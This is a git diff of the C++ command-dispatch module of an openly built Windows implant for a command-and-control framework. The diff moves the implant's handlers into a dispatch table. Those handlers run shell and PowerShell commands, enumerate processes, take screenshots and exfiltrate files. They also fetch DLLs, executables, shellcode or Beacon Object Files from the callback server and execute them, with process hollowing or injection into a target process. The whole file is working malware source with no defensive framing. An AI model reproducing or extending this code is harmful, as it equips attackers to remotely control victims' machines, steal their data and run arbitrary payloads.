@@ -2,24 +2,25 @@
 // Created by diago on 2024-06-06.
 //
 
-#include <main.hpp>
+#include <dispatch.hpp>
+
+
 
 std::string
-format_output(const std::string& str) {
+dispatch::format_output(const std::string& str) {
     return std::string("\"\n") + (str + '\"');
 }
 
-
 command_output
-process_command(
+dispatch::process_command(
         _In_ const std::string& command_str,
         _In_ const char delimeter,
         _In_ const implant_context& ctx
     ) {
 
-    std::vector<std::string> args;
     size_t start            = 0;
     size_t next_delimeter   = command_str.find(delimeter);
+    std::vector<std::string> args;
 
     while(next_delimeter != std::string::npos) {
         if(next_delimeter > start) {
@@ -42,157 +43,260 @@ process_command(
     }
 #endif
 
-    //
-    // gonna just stick with the simplest way of doing this, no std::map or anything.
-    // takes up more LOC, but less things to statically link, so smaller payload size.
-    //
 
-    const std::string cmd_name = args[0];
+    static const dispatch_pair commands[] = {
+        {"pwd",         &dispatch::pwd},
+        {"cd",          &dispatch::cd},
+        {"ls",          &dispatch::ls},
+        {"cat",         &dispatch::cat},
+        {"whoami",      &dispatch::whoami},
+        {"rm",          &dispatch::rm},
+        {"mkdir",       &dispatch::mkdir},
+        {"cp",          &dispatch::cp},
+        {"ps",          &dispatch::ps},
+        {"cmd",         &dispatch::cmd},
+        {"getinfo",     &dispatch::getinfo},
+        {"procenum",    &dispatch::procenum},
+        {"exfil",       &dispatch::exfil},
+        {"screenshot",  &dispatch::screenshot},
+        {"rundll",      &dispatch::rundll},
+        {"runexe",      &dispatch::runexe},
+        {"runshellcode",&dispatch::runshellcode},
+        {"runbof",      &dispatch::runbof},
+    };
 
-
-    if(cmd_name == "pwd") {
-        return { format_output(tasking::pwd()), nullptr, output_type::PLAIN_TEXT };
-    } if(cmd_name == "cd") {
-        return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "ls") {
-        return { format_output(tasking::ls()), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "cat") {
-        return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "whoami") {
-        return { format_output(recon::whoami()), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "rm") {
-        return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "mkdir") {
-        return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "cp") {
-        return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "ps") {
-        return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
-    } if (cmd_name == "cmd") {
-        return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
-    } if(cmd_name == "getinfo") {
-        return { format_output(recon::generate_basic_info()), nullptr, output_type::PLAIN_TEXT };
-    }
-
-
-    if (cmd_name == "procenum") {
-        std::string procs = recon::enumerate_processes();
-
-        if(procs.size() > 15000) {
-            HANDLE hprocs = tasking::write_into_file(procs, "pr.txt", procs.size(), true);
-            if(hprocs == nullptr) {
-                return {format_output("Failed to create output file for process report."), nullptr, output_type::PLAIN_TEXT};
-            }
-            return {"", hprocs, output_type::FILE};
+    for(size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
+        if(args[0] == commands[i].name) {
+            return commands[i].func(args, ctx);
         }
-
-        return { procs, nullptr, output_type::PLAIN_TEXT };
     }
 
-
-    if(cmd_name == "upload") {
-        HANDLE hfile = tasking::get_file_handle(args[1]);
-        if(hfile == nullptr) {
-            return { format_output(io::win32_failure("upload", "CreateFileA")), nullptr, output_type::PLAIN_TEXT };
-        }
-
-        return {"", hfile, output_type::FILE };
-    }
-
-
-    if (cmd_name == "screenshot") {
-        HANDLE hscreenshot = recon::save_screenshot();
-        if(hscreenshot == nullptr) {
-            return {"Failed to save screenshot.", nullptr, output_type::PLAIN_TEXT };
-        }
-
-        return {"", hscreenshot, output_type::FILE};
-    }
-
-
-    if(cmd_name == "rundll") {
-        obfus::sleep(ctx.sleep_time);
-        std::string dll_file;
-
-        if(!networking::http::recieve_file(
-            ctx.hconnect,
-            ctx.callback_object,
-            args[1],
-            ctx.session_token,
-            ctx.is_https,
-            dll_file
-        )) {
-            return {
-                format_output("Failed to download specified DLL: " + args[1]),
-                nullptr,
-                output_type::PLAIN_TEXT
-            };
-        }
-
-        return {
-            format_output(tasking::rundll(dll_file)),
-            nullptr,
-            output_type::PLAIN_TEXT
-        };
-    }
-
-
-    if(cmd_name == "runexe") {
-        obfus::sleep(ctx.sleep_time);
-        std::string exe_file;
-
-        if(!networking::http::recieve_file(
-            ctx.hconnect,
-            ctx.callback_object,
-            args[1],
-            ctx.session_token,
-            ctx.is_https,
-            exe_file
-        )) {
-            return {
-                format_output("Failed to download specified executable: " + args[1]),
-                nullptr,
-                output_type::PLAIN_TEXT
-            };
-        }
-
-        return {
-            format_output(tasking::runexe(args[2] == "hollow", exe_file)),
-            nullptr,
-            output_type::PLAIN_TEXT
-        };
-    }
-
-
-    if(cmd_name == "runshellcode") {
-        obfus::sleep(ctx.sleep_time);
-        std::string shellcode_buff;
-
-        if(!networking::http::recieve_file(
-            ctx.hconnect,
-            ctx.callback_object,
-            args[1],
-            ctx.session_token,
-            ctx.is_https,
-            shellcode_buff
-        )) {
-            return {
-                format_output("Failed to download shellcode: " + args[1]),
-                nullptr,
-                output_type::PLAIN_TEXT
-            };
-        }
-
-        return {
-            format_output(tasking::run_shellcode(GetCurrentProcessId(), false, false, shellcode_buff)),
-            nullptr,
-            output_type::PLAIN_TEXT
-        };
-    }
-
-    if(cmd_name == "runbof") {
-        return { format_output("unimplimented"), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    return { format_output("Unknown command."), nullptr, output_type::PLAIN_TEXT };
+    return { format_output("That command does not exist."), nullptr, output_type::PLAIN_TEXT };
 }
+
+
+command_output
+dispatch::pwd(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::pwd()), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::cd(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::ls(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::ls()), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::cat(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::whoami(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(recon::whoami()), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::rm(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::mkdir(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::cp(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::ps(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::cmd(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::getinfo(const std::vector<std::string> &args, const implant_context &ctx) {
+    return { format_output(recon::generate_basic_info()), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::procenum(const std::vector<std::string> &args, const implant_context &ctx) {
+    std::string procs = recon::enumerate_processes();
+
+    if(procs.size() > 15000) {
+        HANDLE hprocs = tasking::write_into_file(procs, "pr.txt", procs.size(), true);
+        if(hprocs == nullptr) {
+            return {format_output("Failed to create output file for process report."), nullptr, output_type::PLAIN_TEXT};
+        }
+        return {"", hprocs, output_type::FILE};
+    }
+
+    return { procs, nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::exfil(const std::vector<std::string> &args, const implant_context &ctx) {
+    HANDLE hfile = tasking::get_file_handle(args[1]);
+    if(hfile == nullptr) {
+        return { format_output(io::win32_failure("upload", "CreateFileA")), nullptr, output_type::PLAIN_TEXT };
+    }
+
+    return {"", hfile, output_type::FILE };
+}
+
+
+command_output
+dispatch::screenshot(const std::vector<std::string> &args, const implant_context &ctx) {
+    HANDLE hscreenshot = recon::save_screenshot();
+    if(hscreenshot == nullptr) {
+        return {"Failed to save screenshot.", nullptr, output_type::PLAIN_TEXT };
+    }
+
+    return {"", hscreenshot, output_type::FILE};
+}
+
+
+command_output
+dispatch::rundll(const std::vector<std::string> &args, const implant_context &ctx) {
+
+    obfus::sleep(ctx.sleep_time);
+    std::string dll_file;
+
+    if(!networking::http::recieve_file(
+        ctx.hconnect,
+        ctx.callback_object,
+        args[1],
+        ctx.session_token,
+        ctx.is_https,
+        dll_file
+    )) {
+        return {
+            format_output("Failed to download specified DLL: " + args[1]),
+            nullptr,
+            output_type::PLAIN_TEXT
+        };
+    }
+
+    return {
+        format_output(tasking::rundll(dll_file)),
+        nullptr,
+        output_type::PLAIN_TEXT
+    };
+}
+
+
+command_output
+dispatch::runexe(const std::vector<std::string> &args, const implant_context &ctx) {
+
+    obfus::sleep(ctx.sleep_time);
+    std::string exe_file;
+
+    if(!networking::http::recieve_file(
+        ctx.hconnect,
+        ctx.callback_object,
+        args[1],
+        ctx.session_token,
+        ctx.is_https,
+        exe_file
+    )) {
+        return {
+            format_output("Failed to download specified executable: " + args[1]),
+            nullptr,
+            output_type::PLAIN_TEXT
+        };
+    }
+
+    return {
+        format_output(tasking::runexe(args[2] == "hollow", exe_file)),
+        nullptr,
+        output_type::PLAIN_TEXT
+    };
+}
+
+
+command_output
+dispatch::runshellcode(const std::vector<std::string> &args, const implant_context &ctx) {
+
+    obfus::sleep(ctx.sleep_time);
+    std::string shellcode_buff;
+
+    if(!networking::http::recieve_file(
+        ctx.hconnect,
+        ctx.callback_object,
+        args[1],
+        ctx.session_token,
+        ctx.is_https,
+        shellcode_buff
+    )) {
+        return {
+            format_output("Failed to download shellcode: " + args[1]),
+            nullptr,
+            output_type::PLAIN_TEXT
+        };
+    }
+
+    uint32_t pid        = 0;
+    bool     child      = false;
+
+    if(args[2] == "child") {
+        child = true;
+    } else if(args[2] == "local") {
+        pid = GetCurrentProcessId();
+    } else {
+        pid = static_cast<uint32_t>(atoi(args[2].c_str()));
+    }
+
+    return {
+        format_output(tasking::run_shellcode(pid, child, true, shellcode_buff)),
+        nullptr,
+        output_type::PLAIN_TEXT
+    };
+}
+
+
+command_output
+dispatch::runbof(const std::vector<std::string> &args, const implant_context &ctx) {
+    obfus::sleep(ctx.sleep_time);
+    std::string bof_buff;
+
+    if(!networking::http::recieve_file(
+        ctx.hconnect,
+        ctx.callback_object,
+        args[1],
+        ctx.session_token,
+        ctx.is_https,
+        bof_buff
+    )) {
+        return {
+            format_output("Failed to download Beacon Object File: " + args[1]),
+            nullptr,
+            output_type::PLAIN_TEXT
+        };
+    }
+
+    return { format_output(tasking::execute_bof(bof_buff, args.size() < 3 ? nullptr : args[2].c_str())), nullptr, output_type::PLAIN_TEXT };
+}
+
